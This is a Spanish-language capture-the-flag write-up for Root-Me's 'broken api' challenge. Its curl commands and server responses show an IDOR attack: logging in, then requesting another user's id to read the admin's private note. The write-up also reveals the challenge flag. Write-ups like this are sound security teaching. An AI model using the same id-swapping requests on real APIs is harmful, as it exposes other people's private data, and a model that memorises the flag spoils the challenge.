# broken api ,reto de rootme

**CTF:** broken api
**Categoría:** [Web]
**Dificultad:** [Fácil]
**Fecha:** [2025-12-29]

## 🎯 Descripción y Objetivo
ates de entrar al reto,se nos presenta la siguiente premisa:
Tu amigo ha creado una plataforma donde puedes registrarte y publicar una nota privada.
Todo se hace mediante una API. Antes de implementar la interfaz, te pidió que verificaras la seguridad de todo.

la idea original sefia acceder a las notas privadas de otros usuarios.


## 🔍 Reconocimiento
al entrar se nos presenta una interfaz de swagger que nos muestra como se manejan los endpoints
esto lo muestra con la salida que dan comandos curl,la forma mas sencilla de revisar su funcionamiento
es ejecutar estos mismos comandos pero con la caracterisitca de añadir la flag de curl``` -c cookies.txt```
ya que sk intentamos leer notas de otros usuarios sin un suaurio conectado,el servidor nos salta un eror 405
de accedo denegado por falta de permisos
```bash

curl -X 'PUT' \ 'http://api-broken-access.challenge01.root-me.org/api/note' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "note": "string"
}'
<!doctype html>
<html lang=en>
<title>401 Unauthorized</title>
<h1>Unauthorized</h1>
<p>The server could not verify that you are authorized to access the URL requested.
 You either supplied the wrong credentials (e.g. a bad password),
 or your browser doesn&#39;t understand how to supply the credentials required.</p>
~
```

teniendo lo anterior en cuenta procedemos a la creacion un usuario
y a loguearnos como el mismo
 ```bash

curl -X 'POST' \
  'http://api-broken-access.challenge01.root-me.org/api/login' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "username": "reos",
  "password": "reos"
}'
{"message":"Logged in successfully"}
~ $ cd port/Ciberceguridad-portafolio-/Write-Ups/root_me/
~/.../Write-Ups/root_me $ mkdir api_broken
~/.../Write-Ups/root_me $ cd api_broken/
~/.../root_me/api_broken $ curl -X 'POST' \
  'http://api-broken-access.challenge01.root-me.org/api/login' \
  -i \
  -c cookies.txt \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "username": "reos",
  "password": "reos"
}'
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 29 Dec 2025 22:41:26 GMT
Content-Type: application/json
Content-Length: 37
Connection: keep-alive
Access-Control-Allow-Origin: *
Vary: Cookie
Set-Cookie: session=.eJwlzsENwzAIAMBd_O4DbMA4y0TYgNpv0ryq7t5IHeCk-5Q9jzifZXsfVzzK_vKyFaThndCEIrFJHcKtjYmLzZZYV4TWo8LQtAVkgeoW1BwZZhU0RrV6M4Vl0nIiEqmvHDIShSvOzqCBzstTuy5xIgJPmBTRyx25zjj-m1a-P1SxLnE.aVMDlg.Z-B_Z_0cR7B6a8GNKmuaZ8okG7M; HttpOnly; Path=/

{"message":"Logged in successfully"}
```

con esto en mente orocedemos a crear una nota,esto oara seguir el flujo normal de la api:

``` bash

curl -X 'PUT'   'http://api-broken-access.challenge01.root-me.org/api/note'   -H 'accept: application/json'   -H 'Content-Type: application/json'   -d '{
  "note": "string"
}'  -b cookies.txt
{"message":"Note updated successfully."}


```
#Explotacion


haora podemos acceder a nuestras notas con el link que swagger nos proporciona y con las cookies de nuestro usuario

```
curl -X 'GET'   'http://api-broken-access.challenge01.root-me.org/api/user' 
  -H 'accept: application/json' -b cookies.txt -v




* using HTTP/1.x
> GET /api/user HTTP/1.1
> Host: api-broken-access.challenge01.root-me.org
> User-Agent: curl/8.17.0
> Cookie: session=.eJwlzsENwzAIAMBd_O4DbMA4y0TYgNpv0ryq7t5IHeCk-5Q9jzifZXsfVzzK_vKyFaThndCEIrFJHcKtjYmLzZZYV4TWo8LQtAVkgeoW1BwZZhU0RrV6M4Vl0nIiEqmvHDIShSvOzqCBzstTuy5xIgJPmBTRyx25zjj-m1a-P1SxLnE.aVMDlg.Z-B_Z_0cR7B6a8GNKmuaZ8okG7M
> accept: application/json
>
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Mon, 29 Dec 2025 22:48:07 GMT
< Content-Type: application/json
< Content-Length: 47
< Connection: keep-alive
< Access-Control-Allow-Origin: *
< Vary: Cookie
<
{"note":"string","userid":3,"username":"reos"}
```

la inyeccion la podemos realizar en el aparto de user ya que swagger nos muestra como realiza la peticion get
y podemos buscar por id de usuarios,en este caso lo haremos com el id 

```
bash

curl -X 'GET'   'http://api-broken-access.challenge01.root-me.org/api/user/1'   -H 'accept: application/json' -b cookies.txt -v
Note: Unnecessary use of -X or --request, GET is already inferred.
* Host api-broken-access.challenge01.root-me.org:80 was resolved.
* IPv6: 2001:bc8:35b0:c166::151
* IPv4: 212.129.38.224
*   Trying [2001:bc8:35b0:c166::151]:80...
* Immediate connect fail for 2001:bc8:35b0:c166::151: Network is unreachable
*   Trying 212.129.38.224:80...
* Established connection to api-broken-access.challenge01.root-me.org (212.129.38.224 port 80) from 192.168.1.2 port 44682
* using HTTP/1.x
> GET /api/user/1 HTTP/1.1
> Host: api-broken-access.challenge01.root-me.org
> User-Agent: curl/8.17.0
> Cookie: session=.eJwlzsENwzAIAMBd_O4DbMA4y0TYgNpv0ryq7t5IHeCk-5Q9jzifZXsfVzzK_vKyFaThndCEIrFJHcKtjYmLzZZYV4TWo8LQtAVkgeoW1BwZZhU0RrV6M4Vl0nIiEqmvHDIShSvOzqCBzstTuy5xIgJPmBTRyx25zjj-m1a-P1SxLnE.aVMDlg.Z-B_Z_0cR7B6a8GNKmuaZ8okG7M
> accept: application/json
>
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Mon, 29 Dec 2025 22:48:43 GMT
< Content-Type: application/json
< Content-Length: 62
< Connection: keep-alive
< Access-Control-Allow-Origin: *
< Vary: Cookie
<
{"note":"RM{E4sy_1d0r_0n_API}","userid":1,"username":"admin"}

```

esto es una vuelnerabilidad IDOR ya que no hay una correcta validacion al momentod e acceder a la id
de x usuario,esto se podria solucionar internamente validando las mismas cookie sesion de cada usuario
por ejemolo al usuario con id 1 le corresponde las cookies x, y al usuario 2 las cookies y.

